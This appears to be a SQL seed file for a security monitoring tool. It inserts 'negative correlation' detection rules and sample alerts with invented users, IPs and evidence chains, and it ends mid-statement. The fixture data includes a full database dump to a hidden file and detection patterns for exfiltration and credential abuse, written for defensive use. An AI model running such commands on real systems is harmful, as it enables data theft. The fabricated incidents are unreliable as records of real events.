/*
  # Populate Negative Correlation Rules & Detections

  1. Rules (18 creative negative correlation rules across all 5 categories)
    - 5 Missing Prerequisite rules
    - 4 Impossible Coexistence rules
    - 3 Missing Consequence rules
    - 3 Temporal Impossibility rules
    - 3 Physics Violation rules

  2. Detections (25+ live detections with rich evidence chains)
    - Realistic user/host entities
    - Detailed observed vs missing event data
    - Physics violation calculations
    - Evidence chain breadcrumbs
*/

-- ============================================================
-- RULES: Missing Prerequisite
-- "Something happened, but the thing that MUST happen first didn't"
-- ============================================================

INSERT INTO negative_correlation_rules (id, rule_name, rule_code, category, description, observed_event, expected_event, time_window_seconds, constraint_logic, constraint_query, severity, confidence_base, mitre_techniques, false_positive_notes, enabled, detection_count, last_fired_at) VALUES

('b1000000-0000-0000-0000-000000000001',
 'Ghost Command Execution',
 'NC-001',
 'missing_prerequisite',
 'Shell commands were executed on a server, but no SSH, RDP, console login, or jump-host session was established within the expected time window. The commands appear to originate from a phantom session that never authenticated.',
 'Process execution events (bash, cmd, powershell) on target host with valid UID',
 'SSH/RDP/Console login event from same UID to same host within preceding 24h',
 86400,
 'IF process_exec(host=H, user=U) EXISTS AND session_login(host=H, user=U, time > now-24h) NOT EXISTS THEN ALERT',
 'SELECT pe.* FROM process_events pe WHERE pe.host_id = $host AND pe.user_id = $user AND NOT EXISTS (SELECT 1 FROM session_events se WHERE se.host_id = pe.host_id AND se.user_id = pe.user_id AND se.event_type IN (''ssh_login'', ''rdp_login'', ''console_login'') AND se.timestamp BETWEEN pe.timestamp - interval ''24 hours'' AND pe.timestamp)',
 'critical',
 92,
 '{"T1059", "T1078", "T1021"}',
 'Possible FP: cron jobs, systemd services running as user accounts, container exec sessions not logged to central SIEM',
 true, 847, now() - interval '12 minutes'),

('b1000000-0000-0000-0000-000000000002',
 'Silent Privilege Escalation',
 'NC-002',
 'missing_prerequisite',
 'A user account was granted elevated privileges (admin, root, domain admin) but no corresponding change request, approval workflow, or PAM checkout event exists. Privileges materialized without any authorization trail.',
 'User privilege elevation event (group membership change, sudo grant, role assignment)',
 'Change request approval or PAM session checkout within preceding 48h',
 172800,
 'IF privilege_grant(user=U, privilege=P) EXISTS AND (change_request(user=U, approved=true) OR pam_checkout(user=U)) NOT EXISTS THEN ALERT',
 'SELECT pg.* FROM privilege_grants pg WHERE pg.privilege_level IN (''admin'', ''root'', ''domain_admin'') AND NOT EXISTS (SELECT 1 FROM change_requests cr WHERE cr.target_user = pg.user_id AND cr.status = ''approved'' AND cr.completed_at BETWEEN pg.timestamp - interval ''48 hours'' AND pg.timestamp)',
 'critical',
 95,
 '{"T1078.002", "T1098", "T1548"}',
 'Possible FP: Emergency break-glass procedures, automated provisioning systems with separate approval tracking',
 true, 234, now() - interval '3 hours'),

('b1000000-0000-0000-0000-000000000003',
 'Orphan Process Chain',
 'NC-003',
 'missing_prerequisite',
 'A process tree was detected where the root process has no traceable parent chain leading to a legitimate session manager (sshd, login, winlogon). The process appears to have materialized without a valid spawn ancestry.',
 'Running process with broken parent chain (ppid=0 or ppid points to dead/unknown process)',
 'Valid process ancestry chain from session manager to current process',
 60,
 'IF process(pid=P, ppid=PP) EXISTS AND process(pid=PP) NOT EXISTS AND P.ppid != 1 THEN ALERT',
 'SELECT p.* FROM processes p WHERE p.ppid NOT IN (SELECT pid FROM processes) AND p.ppid NOT IN (0, 1, 2) AND p.comm NOT IN (''kernel'', ''init'', ''systemd'')',
 'high',
 88,
 '{"T1055", "T1106", "T1014"}',
 'Possible FP: Process exited between collection intervals, kernel threads, containerized processes with PID namespace isolation',
 true, 1205, now() - interval '45 minutes'),

('b1000000-0000-0000-0000-000000000004',
 'Shadow Database Query',
 'NC-004',
 'missing_prerequisite',
 'Database queries were executed against production tables, but no application-layer authentication event preceded the database session. Queries are arriving from a connection that bypassed the application authentication stack entirely.',
 'SQL query execution event on production database with valid credentials',
 'Application authentication event (OAuth token issue, session cookie creation) for same service account within preceding 1h',
 3600,
 'IF db_query(db=D, user=U, src_ip=IP) EXISTS AND app_auth(service=S, src_ip=IP, time > now-1h) NOT EXISTS THEN ALERT',
 'SELECT dq.* FROM db_query_log dq WHERE dq.database = ''production'' AND NOT EXISTS (SELECT 1 FROM app_auth_events ae WHERE ae.source_ip = dq.source_ip AND ae.timestamp BETWEEN dq.timestamp - interval ''1 hour'' AND dq.timestamp)',
 'critical',
 90,
 '{"T1078", "T1190", "T1213"}',
 'Possible FP: Database admin tools with direct connections, monitoring systems, backup agents',
 true, 156, now() - interval '2 hours'),

('b1000000-0000-0000-0000-000000000005',
 'Invisible Account Creation',
 'NC-005',
 'missing_prerequisite',
 'A new user account appeared in Active Directory or IAM, but no provisioning workflow, HR onboarding event, or admin action log entry exists. The account appeared as if created by a ghost.',
 'New user account creation event in AD/IAM',
 'HR onboarding ticket, provisioning workflow execution, or admin CLI/console action log',
 604800,
 'IF account_create(user=U) EXISTS AND (hr_onboard(user=U) OR provision_workflow(user=U) OR admin_action(target=U)) NOT EXISTS THEN ALERT',
 'SELECT ac.* FROM account_creation_events ac WHERE NOT EXISTS (SELECT 1 FROM hr_events he WHERE he.employee_id = ac.employee_id AND he.event_type = ''onboarding'') AND NOT EXISTS (SELECT 1 FROM admin_audit_log al WHERE al.target_account = ac.account_name AND al.action = ''create_user'')',
 'critical',
 96,
 '{"T1136.001", "T1136.002", "T1098"}',
 'Possible FP: Automated service account creation by IaC pipelines, break-glass account creation during outages',
 true, 42, now() - interval '6 hours'),

-- ============================================================
-- RULES: Impossible Coexistence
-- "Two things happened simultaneously that physically/logically CANNOT both be true"
-- ============================================================

('b1000000-0000-0000-0000-000000000006',
 'Quantum Presence Paradox',
 'NC-006',
 'impossible_coexistence',
 'A user has an active VPN session originating from an external IP while simultaneously badging into a secure facility. Unless the user has mastered quantum superposition, one of these identities is compromised.',
 'Active VPN session from external IP AND physical badge swipe at secure facility',
 'These events should be mutually exclusive unless user terminated VPN before entering building',
 600,
 'IF vpn_session(user=U, status=active, src_ip=EXTERNAL) EXISTS AND badge_swipe(user=U, location=L, time=T) EXISTS AND vpn_session.last_activity > badge_swipe.time - 10min THEN ALERT',
 'SELECT vs.*, bs.* FROM vpn_sessions vs JOIN badge_swipes bs ON vs.user_id = bs.user_id WHERE vs.status = ''active'' AND vs.last_activity > bs.swipe_time - interval ''10 minutes'' AND vs.source_ip NOT IN (SELECT ip FROM corporate_ip_ranges)',
 'critical',
 97,
 '{"T1078", "T1133", "T1078.004"}',
 'Possible FP: User forgot to disconnect VPN, VPN session keepalive after disconnect, shared accounts',
 true, 89, now() - interval '28 minutes'),

('b1000000-0000-0000-0000-000000000007',
 'Dual-Session Bilocation',
 'NC-007',
 'impossible_coexistence',
 'The same user account is authenticated in two interactive sessions on hosts in different network segments that require physical access (air-gapped lab, SCADA network, classified enclave). No remote bridging exists between these segments.',
 'Active interactive sessions on two hosts in physically isolated network segments',
 'At most one active session in physically isolated segments (no bridging possible)',
 120,
 'IF session(user=U, host=H1, segment=S1, type=interactive) EXISTS AND session(user=U, host=H2, segment=S2, type=interactive) EXISTS AND S1 != S2 AND segments_are_airgapped(S1, S2) THEN ALERT',
 'SELECT s1.*, s2.* FROM active_sessions s1 JOIN active_sessions s2 ON s1.user_id = s2.user_id WHERE s1.segment_id != s2.segment_id AND s1.session_type = ''interactive'' AND s2.session_type = ''interactive'' AND EXISTS (SELECT 1 FROM airgap_pairs WHERE (seg_a = s1.segment_id AND seg_b = s2.segment_id))',
 'critical',
 98,
 '{"T1078", "T1021", "T1550"}',
 'Possible FP: Network segmentation misconfiguration allowing unexpected routing, maintenance windows with temporary bridges',
 true, 12, now() - interval '4 hours'),

('b1000000-0000-0000-0000-000000000008',
 'Dead User Walking',
 'NC-008',
 'impossible_coexistence',
 'An account is generating active authentication events while the account status in IAM shows disabled, locked, or terminated. A dead account is somehow still walking the network.',
 'Authentication success event from a disabled/locked/terminated account',
 'Account should NOT be able to authenticate when status is disabled/locked/terminated',
 0,
 'IF auth_success(user=U) EXISTS AND account_status(user=U, status IN (disabled, locked, terminated)) EXISTS THEN ALERT',
 'SELECT ae.* FROM auth_events ae JOIN user_accounts ua ON ae.user_id = ua.id WHERE ae.event_type = ''auth_success'' AND ua.status IN (''disabled'', ''locked'', ''terminated'')',
 'critical',
 99,
 '{"T1078.001", "T1078.002", "T1098"}',
 'Possible FP: Replication lag between IAM and authentication infrastructure, cached Kerberos tickets not yet expired',
 true, 67, now() - interval '1 hour'),

('b1000000-0000-0000-0000-000000000009',
 'Encryption Without Keys',
 'NC-009',
 'impossible_coexistence',
 'Encrypted data blobs were written to storage, but no key generation, key retrieval, or KMS API call exists in the same timeframe. Data was encrypted without any observable key management activity, suggesting use of hardcoded or smuggled keys.',
 'Encrypted data write event (detected via entropy analysis) to storage service',
 'KMS GetKey, GenerateDataKey, or key rotation event for the same service identity within 1h',
 3600,
 'IF encrypted_write(service=S, entropy > 7.8) EXISTS AND kms_api_call(service=S, action IN (GetKey, GenerateDataKey)) NOT EXISTS THEN ALERT',
 'SELECT ew.* FROM storage_events ew WHERE ew.entropy_score > 7.8 AND NOT EXISTS (SELECT 1 FROM kms_audit_log kl WHERE kl.caller_identity = ew.service_identity AND kl.timestamp BETWEEN ew.timestamp - interval ''1 hour'' AND ew.timestamp + interval ''5 minutes'')',
 'high',
 85,
 '{"T1486", "T1027", "T1560"}',
 'Possible FP: Client-side encryption with cached keys, HSM-based encryption not logged to central KMS, pre-encrypted data transfer',
 true, 31, now() - interval '5 hours'),

-- ============================================================
-- RULES: Missing Consequence
-- "Something completed successfully, but the expected side effects never appeared"
-- ============================================================

('b1000000-0000-0000-0000-000000000010',
 'Phantom File Transfer',
 'NC-010',
 'missing_consequence',
 'Application logs show a large file transfer completed successfully (100MB+), but the network monitoring layer recorded no corresponding flow of that size. Either the data was exfiltrated through an unmonitored channel or the application log was forged.',
 'Application-level file transfer completion event (>100MB reported size)',
 'Network flow record with matching src/dst and comparable byte count within same time window',
 300,
 'IF file_transfer(app=A, size > 100MB, status=complete) EXISTS AND netflow(src=A.src, dst=A.dst, bytes > 80MB, time_window=5min) NOT EXISTS THEN ALERT',
 'SELECT ft.* FROM file_transfer_logs ft WHERE ft.size_bytes > 104857600 AND ft.status = ''completed'' AND NOT EXISTS (SELECT 1 FROM netflow_records nf WHERE nf.src_ip = ft.source_ip AND nf.dst_ip = ft.dest_ip AND nf.bytes_transferred > ft.size_bytes * 0.8 AND nf.timestamp BETWEEN ft.start_time AND ft.end_time + interval ''5 minutes'')',
 'critical',
 93,
 '{"T1048", "T1041", "T1071"}',
 'Possible FP: Encrypted tunnels aggregated differently in netflow, compression reducing actual bytes, transfer via localhost/loopback',
 true, 78, now() - interval '90 minutes'),

('b1000000-0000-0000-0000-000000000011',
 'Silent Deployment',
 'NC-011',
 'missing_consequence',
 'A CI/CD pipeline reports a successful production deployment, but no container restart, service reload, or binary change event was detected on the target infrastructure. The deployment claimed to succeed without actually changing anything.',
 'CI/CD pipeline completion event with status=success and target=production',
 'Container restart, service reload, or file hash change on deployment target within 15min',
 900,
 'IF deploy_event(pipeline=P, status=success, target=production) EXISTS AND (container_restart(host=target, time_window=15min) OR service_reload(host=target) OR file_change(path=deploy_path)) NOT EXISTS THEN ALERT',
 'SELECT de.* FROM deployment_events de WHERE de.status = ''success'' AND de.target_env = ''production'' AND NOT EXISTS (SELECT 1 FROM infrastructure_events ie WHERE ie.host_id = de.target_host AND ie.event_type IN (''container_restart'', ''service_reload'', ''binary_replaced'') AND ie.timestamp BETWEEN de.completed_at AND de.completed_at + interval ''15 minutes'')',
 'high',
 87,
 '{"T1195.002", "T1059", "T1072"}',
 'Possible FP: Blue/green deployments where traffic switch happens later, canary deployments affecting subset of hosts, cached deployment status',
 true, 45, now() - interval '7 hours'),

('b1000000-0000-0000-0000-000000000012',
 'Backup Black Hole',
 'NC-012',
 'missing_consequence',
 'Backup job reports successful completion with expected data volume, but no corresponding I/O spike was recorded on the storage subsystem and no new objects appeared in the backup target. Data supposedly backed up vanished into a black hole.',
 'Backup completion event with status=success and reported size > 0',
 'Storage I/O spike on backup target AND new objects/files in backup destination',
 600,
 'IF backup_complete(job=J, status=success, size > 0) EXISTS AND (storage_io_spike(target=backup_dest, time_window=10min) OR new_objects(path=backup_path)) NOT EXISTS THEN ALERT',
 'SELECT bc.* FROM backup_events bc WHERE bc.status = ''success'' AND bc.reported_size_gb > 0 AND NOT EXISTS (SELECT 1 FROM storage_metrics sm WHERE sm.target_id = bc.backup_target AND sm.iops_peak > sm.baseline_iops * 2 AND sm.timestamp BETWEEN bc.start_time AND bc.end_time)',
 'high',
 84,
 '{"T1490", "T1485", "T1561"}',
 'Possible FP: Deduplication reducing actual I/O, backup to tape with different monitoring, incremental backups with minimal changes',
 true, 23, now() - interval '12 hours'),

-- ============================================================
-- RULES: Temporal Impossibility
-- "Events occurred in a time sequence that violates physical or logical constraints"
-- ============================================================

('b1000000-0000-0000-0000-000000000013',
 'Human Speed Violation',
 'NC-013',
 'temporal_impossibility',
 'A user performed a sequence of actions (code review, approval, merge, deployment) in a timeframe too short for a human to have meaningfully reviewed the content. 500+ lines reviewed and approved in under 30 seconds suggests automated rubber-stamping or credential abuse.',
 'Code review approval event followed by merge event with <30s gap for 500+ changed lines',
 'Minimum human review time based on lines changed (est. 2 lines/second for senior dev)',
 30,
 'IF code_review_approve(user=U, lines_changed > 500, time=T1) EXISTS AND merge_event(user=U, time=T2) EXISTS AND (T2 - T1) < 30s THEN ALERT',
 'SELECT cr.* FROM code_review_events cr JOIN merge_events me ON cr.pull_request_id = me.pull_request_id WHERE cr.action = ''approve'' AND me.merged_at - cr.approved_at < interval ''30 seconds'' AND cr.lines_changed > 500',
 'high',
 91,
 '{"T1195.002", "T1059", "T1199"}',
 'Possible FP: Auto-generated code changes (dependency bumps), re-review of previously reviewed code, bot accounts',
 true, 167, now() - interval '2 hours'),

('b1000000-0000-0000-0000-000000000014',
 'Teleportation Anomaly',
 'NC-014',
 'temporal_impossibility',
 'A user authenticated from two geolocations that are physically impossible to travel between in the elapsed time. Login from Tokyo, then 12 minutes later from London. Unless they have access to a teleporter, one session is compromised.',
 'Two authentication events from same user with geolocation gap exceeding travel possibility',
 'Minimum travel time between geolocations must be respected (speed < 1000 km/h)',
 0,
 'IF auth(user=U, geo=G1, time=T1) EXISTS AND auth(user=U, geo=G2, time=T2) EXISTS AND distance(G1,G2) / (T2-T1) > 1000 km/h THEN ALERT',
 'SELECT a1.*, a2.*, earth_distance(ll_to_earth(a1.lat, a1.lon), ll_to_earth(a2.lat, a2.lon)) / 1000 as distance_km, EXTRACT(EPOCH FROM a2.timestamp - a1.timestamp) / 3600 as hours_elapsed FROM auth_events a1 JOIN auth_events a2 ON a1.user_id = a2.user_id WHERE a2.timestamp > a1.timestamp AND (earth_distance(ll_to_earth(a1.lat, a1.lon), ll_to_earth(a2.lat, a2.lon)) / 1000) / (EXTRACT(EPOCH FROM a2.timestamp - a1.timestamp) / 3600) > 1000',
 'critical',
 96,
 '{"T1078", "T1078.004", "T1550.001"}',
 'Possible FP: VPN exit nodes in different countries, corporate proxy chains, IPv4 geolocation inaccuracy for mobile carriers',
 true, 234, now() - interval '18 minutes'),

('b1000000-0000-0000-0000-000000000015',
 'Retroactive Timestamp Manipulation',
 'NC-015',
 'temporal_impossibility',
 'Events arrived at the SIEM with timestamps that precede the creation timestamp of the log source itself. The server that supposedly generated the events didn''t exist yet when the events claim to have occurred. Someone is backdating logs.',
 'Events with timestamps predating the creation/first-boot of their source host',
 'All event timestamps should be >= source host creation timestamp',
 0,
 'IF event(source=H, timestamp=T) EXISTS AND host_creation(host=H, created_at=C) EXISTS AND T < C THEN ALERT',
 'SELECT e.* FROM security_events e JOIN host_inventory hi ON e.source_host = hi.hostname WHERE e.event_time < hi.first_boot_time',
 'high',
 89,
 '{"T1070.006", "T1070", "T1036"}',
 'Possible FP: VM clones inheriting parent timestamps, timezone misconfiguration, NTP sync issues on first boot',
 true, 56, now() - interval '36 hours'),

-- ============================================================
-- RULES: Physics Violation
-- "Real-world physical constraints make this activity impossible"
-- ============================================================

('b1000000-0000-0000-0000-000000000016',
 'Midnight Badge Paradox',
 'NC-016',
 'physics_violation',
 'An employee badged into a secure floor at 3:00 AM, but parking garage sensors show no vehicle entry after hours, no taxi/rideshare drop-off was logged at building entrance cameras, and the lobby door sensor shows no entry. They appeared on a secure floor without entering the building.',
 'Badge swipe on secure floor access point during off-hours (10PM-6AM)',
 'Parking garage entry OR lobby door sensor OR elevator call from ground floor within preceding 30min',
 1800,
 'IF badge_swipe(user=U, floor=secure, time=OFF_HOURS) EXISTS AND (parking_entry(user=U) OR lobby_sensor(time_window=30min) OR elevator_call(floor=ground)) NOT EXISTS THEN ALERT',
 'SELECT bs.* FROM badge_swipes bs WHERE bs.access_level = ''secure'' AND EXTRACT(HOUR FROM bs.swipe_time) NOT BETWEEN 6 AND 22 AND NOT EXISTS (SELECT 1 FROM parking_events pe WHERE pe.badge_id = bs.badge_id AND pe.entry_time BETWEEN bs.swipe_time - interval ''30 minutes'' AND bs.swipe_time) AND NOT EXISTS (SELECT 1 FROM door_sensors ds WHERE ds.location = ''main_lobby'' AND ds.trigger_time BETWEEN bs.swipe_time - interval ''30 minutes'' AND bs.swipe_time)',
 'critical',
 94,
 '{"T1200", "T1078.001", "T1556"}',
 'Possible FP: Employee stayed overnight, tailgating through parking gate, maintenance entrances with separate sensors',
 true, 18, now() - interval '14 hours'),

('b1000000-0000-0000-0000-000000000017',
 'USB Data Telekinesis',
 'NC-017',
 'physics_violation',
 'DLP detected sensitive data written to a USB device on a workstation, but the endpoint agent reports no USB device insertion event. Data moved to a storage device that was never physically connected. Suggests driver-level DLP bypass or spoofed device events.',
 'DLP alert for sensitive data written to removable storage on endpoint',
 'USB device insertion event from endpoint agent for same host within preceding session',
 7200,
 'IF dlp_alert(host=H, destination=USB, data_class=sensitive) EXISTS AND usb_insert(host=H, time_window=2h) NOT EXISTS THEN ALERT',
 'SELECT da.* FROM dlp_alerts da WHERE da.destination_type = ''removable_storage'' AND da.data_classification IN (''confidential'', ''restricted'', ''pii'') AND NOT EXISTS (SELECT 1 FROM endpoint_events ee WHERE ee.host_id = da.host_id AND ee.event_type = ''usb_device_connected'' AND ee.timestamp BETWEEN da.event_time - interval ''2 hours'' AND da.event_time + interval ''5 minutes'')',
 'critical',
 91,
 '{"T1052", "T1091", "T1025"}',
 'Possible FP: Network-mapped drives misclassified as removable, virtual USB devices for VM passthrough, endpoint agent USB logging gap',
 true, 7, now() - interval '48 hours'),

('b1000000-0000-0000-0000-000000000018',
 'Invisible Network Hop',
 'NC-018',
 'physics_violation',
 'A lateral movement was detected between two hosts, but no router, switch, or firewall in the network path between them logged any traffic. The packets traversed the network infrastructure without leaving any trace on intermediate devices.',
 'Lateral movement event (RDP, SMB, WMI) between hosts on different subnets',
 'Firewall/router/switch flow log for traffic between source and destination subnets',
 120,
 'IF lateral_movement(src=H1, dst=H2, subnets_differ=true) EXISTS AND (fw_log(src_subnet, dst_subnet) OR switch_flow(src_mac, dst_mac)) NOT EXISTS THEN ALERT',
 'SELECT lm.* FROM lateral_movement_events lm WHERE lm.src_subnet != lm.dst_subnet AND NOT EXISTS (SELECT 1 FROM firewall_logs fl WHERE fl.src_ip = lm.src_ip AND fl.dst_ip = lm.dst_ip AND fl.timestamp BETWEEN lm.event_time - interval ''1 minute'' AND lm.event_time + interval ''1 minute'') AND NOT EXISTS (SELECT 1 FROM switch_flow_logs sf WHERE sf.src_mac = lm.src_mac AND sf.dst_mac = lm.dst_mac AND sf.timestamp BETWEEN lm.event_time - interval ''1 minute'' AND lm.event_time + interval ''1 minute'')',
 'critical',
 97,
 '{"T1021", "T1071", "T1572"}',
 'Possible FP: Direct L2 adjacency not traversing monitored infrastructure, monitoring gaps during device reboots, tunnel traffic aggregated at different layer',
 true, 34, now() - interval '3 hours');


-- ============================================================
-- DETECTIONS: Recent firing instances with rich evidence
-- ============================================================

-- Detection 1: Ghost Command on prod-db-03
INSERT INTO negative_correlation_detections (rule_id, detection_time, observed_event_detail, missing_event_detail, entity_type, entity_id, confidence_score, severity, status, evidence_chain, time_gap_seconds, physics_violation) VALUES
('b1000000-0000-0000-0000-000000000001',
 now() - interval '12 minutes',
 '{"event_type": "process_execution", "host": "prod-db-03.internal", "user": "jchen", "process": "/bin/bash", "command": "mysqldump --all-databases > /tmp/.backup.sql.gz", "pid": 28471, "timestamp": "2026-04-08T03:47:12Z", "working_dir": "/var/lib/mysql"}',
 '{"expected": "SSH/RDP/Console login", "searched_window": "24 hours", "searched_sources": ["sshd logs", "PAM auth", "jump-host sessions", "VPN gateway", "console login"], "result": "NO matching session found for user jchen on prod-db-03 in last 24h", "last_known_login": "2026-04-06T14:22:00Z (2 days ago via jump-host)"}',
 'user', 'jchen',
 96, 'critical', 'investigating',
 '[{"seq": 1, "source": "endpoint_agent", "detail": "Process bash (pid 28471) spawned by unknown parent ppid 1847", "time": "03:47:12Z"}, {"seq": 2, "source": "siem_correlation", "detail": "No SSH key exchange or password auth for jchen on prod-db-03 in 48h", "time": "03:47:15Z"}, {"seq": 3, "source": "network_monitor", "detail": "No inbound TCP SYN to port 22 on prod-db-03 from jchen known IPs in 24h", "time": "03:47:15Z"}, {"seq": 4, "source": "pam_audit", "detail": "Last PAM session for jchen on prod-db-03: 2026-04-06T14:22:00Z", "time": "03:47:16Z"}, {"seq": 5, "source": "command_analysis", "detail": "Command is a full database dump to hidden file - HIGH RISK exfiltration pattern", "time": "03:47:18Z"}]',
 172800, '{}'),

-- Detection 2: Quantum Presence - VPN + Badge
('b1000000-0000-0000-0000-000000000006',
 now() - interval '28 minutes',
 '{"vpn_session": {"user": "mwilliams", "source_ip": "185.220.101.47", "geo": "Amsterdam, Netherlands", "status": "active", "connected_since": "2026-04-08T02:15:00Z", "bytes_transferred": 847293012, "last_activity": "2026-04-08T03:31:42Z"}, "badge_event": {"user": "mwilliams", "location": "HQ Building A, Floor 3, Server Room", "badge_id": "EMP-4472", "swipe_time": "2026-04-08T03:28:00Z", "access_granted": true}}',
 '{"expected": "VPN session should be disconnected before physical badge-in, OR badge-in should not occur while VPN is active from foreign IP", "vpn_disconnect_event": "NOT FOUND", "travel_analysis": "Amsterdam to HQ (San Francisco): minimum 11 hours flight time. VPN active from Amsterdam 13 minutes before badge swipe in SF."}',
 'user', 'mwilliams',
 98, 'critical', 'open',
 '[{"seq": 1, "source": "vpn_gateway", "detail": "Active session from 185.220.101.47 (TOR exit node in Amsterdam) since 02:15Z", "time": "03:28:00Z"}, {"seq": 2, "source": "badge_system", "detail": "Badge EMP-4472 (M. Williams) swiped at Server Room - Floor 3", "time": "03:28:00Z"}, {"seq": 3, "source": "threat_intel", "detail": "185.220.101.47 is a known TOR exit node - Confidence: 99%", "time": "03:28:05Z"}, {"seq": 4, "source": "geo_analysis", "detail": "Physical presence: San Francisco. VPN origin: Amsterdam. Distance: 8,650 km. Time gap: 13 minutes. Required speed: 39,923 km/h", "time": "03:28:06Z"}, {"seq": 5, "source": "badge_history", "detail": "M. Williams badged into parking garage at 03:15Z, lobby at 03:20Z, elevator at 03:24Z - consistent physical presence", "time": "03:28:10Z"}]',
 780,
 '{"distance_km": 8650, "time_gap_minutes": 13, "required_speed_kmh": 39923, "max_possible_speed_kmh": 1000, "impossibility_factor": 39.9, "conclusion": "VPN session cannot be from the same person who badged in"}'),

-- Detection 3: Dead User Walking
('b1000000-0000-0000-0000-000000000008',
 now() - interval '1 hour',
 '{"auth_event": {"user": "rthompson", "auth_type": "kerberos_tgt", "source_host": "WS-FIN-042", "dc": "dc02.corp.local", "ticket_flags": "forwardable, renewable", "timestamp": "2026-04-08T02:55:00Z"}, "account_status": {"user": "rthompson", "status": "terminated", "termination_date": "2026-03-15", "reason": "involuntary", "disabled_date": "2026-03-15T17:00:00Z", "last_password_reset": "2026-03-15T17:00:00Z"}}',
 '{"expected": "Disabled/terminated accounts should NOT be able to obtain Kerberos TGTs", "investigation": "Account was terminated 24 days ago. Password was reset at termination. Kerberos TGT obtained suggests: (1) ticket was cached before termination and not purged, (2) account was re-enabled by someone, (3) golden ticket attack using krbtgt hash", "ad_replication_check": "All DCs show account as disabled - replication is consistent"}',
 'user', 'rthompson',
 99, 'critical', 'investigating',
 '[{"seq": 1, "source": "kdc_audit", "detail": "TGT issued for rthompson@CORP.LOCAL by dc02 - ticket lifetime 10h", "time": "02:55:00Z"}, {"seq": 2, "source": "iam_system", "detail": "Account rthompson: status=TERMINATED since 2026-03-15, disabled=true", "time": "02:55:02Z"}, {"seq": 3, "source": "ad_audit", "detail": "No account enable/modification events for rthompson since termination", "time": "02:55:03Z"}, {"seq": 4, "source": "krbtgt_analysis", "detail": "TGT encryption type: AES256 - consistent with legitimate DC issuance OR golden ticket", "time": "02:55:05Z"}, {"seq": 5, "source": "host_analysis", "detail": "WS-FIN-042 is rthompson former workstation - assigned to new employee but not reimaged", "time": "02:55:08Z"}, {"seq": 6, "source": "risk_score", "detail": "Combined risk: CRITICAL - terminated employee with active authentication on former workstation", "time": "02:55:10Z"}]',
 2073600, '{}'),

-- Detection 4: Teleportation Anomaly
('b1000000-0000-0000-0000-000000000014',
 now() - interval '18 minutes',
 '{"login_1": {"user": "agarcia", "time": "2026-04-08T03:10:00Z", "source_ip": "103.152.220.44", "geo": {"city": "Tokyo", "country": "Japan", "lat": 35.6762, "lon": 139.6503}}, "login_2": {"user": "agarcia", "time": "2026-04-08T03:22:00Z", "source_ip": "31.13.80.19", "geo": {"city": "London", "country": "United Kingdom", "lat": 51.5074, "lon": -0.1278}}}',
 '{"expected": "Minimum travel time between Tokyo and London is ~12 hours (9,560 km by air)", "time_between_logins_minutes": 12, "distance_km": 9560, "implied_speed_kmh": 47800, "fastest_commercial_flight_kmh": 920, "impossibility_factor": 51.9}',
 'user', 'agarcia',
 97, 'critical', 'open',
 '[{"seq": 1, "source": "auth_gateway", "detail": "SSO login from 103.152.220.44 (Tokyo, Japan) - MFA passed via push notification", "time": "03:10:00Z"}, {"seq": 2, "source": "auth_gateway", "detail": "SSO login from 31.13.80.19 (London, UK) - MFA passed via push notification", "time": "03:22:00Z"}, {"seq": 3, "source": "geo_engine", "detail": "Distance: 9,560 km. Time gap: 12 min. Required speed: 47,800 km/h (Mach 39)", "time": "03:22:05Z"}, {"seq": 4, "source": "mfa_analysis", "detail": "BOTH logins passed MFA - suggests device compromise or MFA fatigue attack", "time": "03:22:08Z"}, {"seq": 5, "source": "ip_reputation", "detail": "103.152.220.44: Datacenter IP (Choopa/Vultr). 31.13.80.19: Residential UK ISP. Neither is corporate.", "time": "03:22:10Z"}]',
 720,
 '{"distance_km": 9560, "time_gap_minutes": 12, "required_speed_kmh": 47800, "max_possible_speed_kmh": 1000, "impossibility_factor": 47.8, "login_1_geo": "Tokyo, Japan", "login_2_geo": "London, UK", "conclusion": "Physically impossible travel - at least one session is compromised"}'),

-- Detection 5: Silent Privilege Escalation
('b1000000-0000-0000-0000-000000000002',
 now() - interval '3 hours',
 '{"event_type": "group_membership_change", "user": "slee", "group_added": "Domain Admins", "performed_by": "svc-automation", "dc": "dc01.corp.local", "timestamp": "2026-04-08T00:44:00Z"}',
 '{"expected": "ServiceNow change request OR CyberArk PAM checkout OR manager approval email", "searched_systems": ["ServiceNow ITSM", "CyberArk PAM", "Approval Workflow Engine", "Jira IT tickets", "Email gateway"], "result": "NO authorization artifact found for adding slee to Domain Admins", "svc_automation_analysis": "Service account svc-automation is used by 3 orchestration systems. None have a scheduled job matching this action."}',
 'user', 'slee',
 95, 'critical', 'investigating',
 '[{"seq": 1, "source": "ad_audit", "detail": "User slee added to Domain Admins by svc-automation at 00:44Z", "time": "00:44:00Z"}, {"seq": 2, "source": "itsm_query", "detail": "No open change requests for user slee or Domain Admins group modification", "time": "00:44:05Z"}, {"seq": 3, "source": "pam_audit", "detail": "No CyberArk checkout for svc-automation or Domain Admins management in 48h", "time": "00:44:06Z"}, {"seq": 4, "source": "svc_account_analysis", "detail": "svc-automation last legitimate use was a scheduled password rotation at 22:00Z", "time": "00:44:10Z"}, {"seq": 5, "source": "risk_assessment", "detail": "Domain Admin access grants full AD control - combined with no authorization trail this is a CRITICAL finding", "time": "00:44:15Z"}]',
 0, '{}'),

-- Detection 6: Phantom File Transfer
('b1000000-0000-0000-0000-000000000010',
 now() - interval '90 minutes',
 '{"event_type": "file_transfer_complete", "application": "internal-fileserver-v3", "source_host": "fs01.corp.local", "dest_host": "unknown-external", "dest_ip": "45.33.32.156", "filename": "Q4_financial_consolidated.7z", "size_bytes": 524288000, "duration_seconds": 180, "protocol": "HTTPS", "status": "completed"}',
 '{"expected": "Network flow record matching ~500MB outbound transfer to 45.33.32.156", "searched_sources": ["Palo Alto NGFW flows", "Cisco Netflow v9", "AWS VPC Flow Logs", "Proxy access logs"], "result": "NO flow record exceeding 10MB to 45.33.32.156 found in any network monitoring system", "proxy_check": "No CONNECT or GET request to 45.33.32.156 in proxy logs", "dns_check": "No DNS resolution for any domain resolving to 45.33.32.156"}',
 'host', 'fs01.corp.local',
 93, 'critical', 'open',
